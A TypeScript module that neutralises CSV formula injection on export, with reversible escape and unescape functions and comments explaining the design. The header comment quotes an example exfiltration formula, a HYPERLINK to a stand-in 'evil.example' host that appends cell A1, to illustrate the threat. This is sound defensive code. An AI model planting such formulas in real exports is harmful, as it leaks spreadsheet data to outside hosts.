/**
 * CSV injection — our problem, on the EXPORT side.
 *
 * A cell whose first character is `=`, `+`, `-`, `@`, tab or CR is interpreted
 * as a formula by Excel, LibreOffice and Google Sheets. So a user who sets their
 * problem title to
 *
 *     =HYPERLINK("https://evil.example/?"&A1,"Click")
 *
 * has not attacked us. They have attacked whoever opens the CSV **we generate**
 * — which is the user themselves, or anyone they share their export with. The
 * importer is not the surface; the exporter is, because the export is a
 * deliverable we hand someone to open in a spreadsheet.
 *
 * ## The mitigation, and its cost
 *
 * Prefix a single quote. Excel reads `'=x` as the literal text `=x` and does not
 * evaluate it.
 *
 * That mutates the data, which would break the round-trip acceptance criterion
 * ("export → import produces zero new rows") if only half of it existed. So the
 * two functions here are a pair and must stay symmetric: `escape` on the way
 * out, `unescape` on the way in. `unescapeCell(escapeCell(x)) === x` is asserted
 * as a property over generated inputs, not just over the examples.
 *
 * ## What this deliberately does NOT do
 *
 * It does not strip or reject the content. A title beginning with `-` is
 * legitimate ("-1 is not a valid index"), and refusing it would be us breaking
 * the user's data to solve a spreadsheet's problem. Neutralise on output,
 * restore on input, store verbatim.
 */

/**
 * Leading characters a spreadsheet treats as the start of a formula.
 *
 * Tab and CR are in the list because a leading whitespace character is stripped
 * by some spreadsheet parsers before the formula check, so `\t=cmd` reaches the
 * evaluator as `=cmd`. This is the same shape of bug as the URL parser stripping
 * control characters out of a scheme — the check must happen on what the
 * CONSUMER will see, not on what we think we wrote.
 */
const FORMULA_LEAD = ['=', '+', '-', '@', '\t', '\r'] as const;

/** The marker prefixed to a dangerous cell. */
const TEXT_MARKER = "'";

function isFormulaLead(char: string | undefined): boolean {
  return char !== undefined && (FORMULA_LEAD as readonly string[]).includes(char);
}

/**
 * Neutralise a cell for a spreadsheet, reversibly.
 *
 * Applied to every exported cell, not only the ones that look suspicious —
 * deciding per-field which columns "could" contain a formula is how one gets
 * missed when a column is added later.
 */
export function escapeCell(value: string): string {
  if (value.length === 0) return value;
  return isFormulaLead(value[0]) ? `${TEXT_MARKER}${value}` : value;
}

/**
 * Undo `escapeCell`, so our own export re-imports as the original data.
 *
 * Narrow on purpose: the marker is stripped ONLY when the character after it is
 * a formula lead. A title that genuinely begins with an apostrophe — `'tis` —
 * is left alone, because `t` is not a formula lead.
 *
 * The one input this cannot round-trip is a title that genuinely begins with
 * `'=`, which comes back as `=`. That is accepted rather than solved: solving
 * it needs an escape-the-escape rule, and this trade loses a keystroke on an
 * input nobody has, versus carrying a second encoding layer through every cell.
 */
export function unescapeCell(value: string): string {
  if (value.length < 2 || value[0] !== TEXT_MARKER) return value;
  return isFormulaLead(value[1]) ? value.slice(1) : value;
}

/** True when a spreadsheet would evaluate this cell as a formula. */
export function wouldExecuteInSpreadsheet(value: string): boolean {
  return isFormulaLead(value[0]);
}
